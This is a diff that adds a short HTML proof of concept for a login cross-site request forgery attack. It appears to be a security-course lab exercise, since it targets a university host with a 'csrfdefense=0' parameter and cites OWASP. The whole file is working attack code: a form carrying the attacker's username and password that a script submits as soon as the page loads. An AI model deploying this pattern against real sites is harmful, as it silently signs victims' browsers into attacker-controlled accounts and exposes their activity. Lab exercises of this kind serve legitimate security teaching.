@@ -1,0 +1,10 @@
+<!-- reference https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)-->
+<body>
+<form id="form" action="http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" method="POST">
+	<input name="username" value="attacker"/>
+	<input name="password" value="l33th4x"/>
+</form>
+<script>
+	document.getElementById("form").submit();
+</script>
+</body>
